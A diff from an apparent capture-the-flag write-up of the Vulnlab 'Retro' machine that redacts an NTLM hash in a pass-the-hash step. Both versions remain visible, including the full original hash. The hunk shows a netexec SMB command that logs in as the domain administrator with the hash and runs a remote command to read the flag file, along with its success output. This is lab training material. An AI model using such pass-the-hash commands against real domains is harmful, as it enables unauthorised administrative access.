@@ -363,9 +363,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 Then we can use that that hash for PTH (Pass the hash) attack.
 
 ```
-syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 252fac7066d93dd009d4fd2cd0368389 -x "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 25<hash> -x "cmd /c type C:\Users\Administrator\Desktop\root.txt"
 SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
-SMB         10.10.64.243    445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
+SMB         10.10.64.243    445    DC               [+] retro.vl\administrator:25<hash> (Pwn3d!)
 SMB         10.10.64.243    445    DC               [+] Executed command via wmiexec
 SMB         10.10.64.243    445    DC               VL{<hash>}
 ```
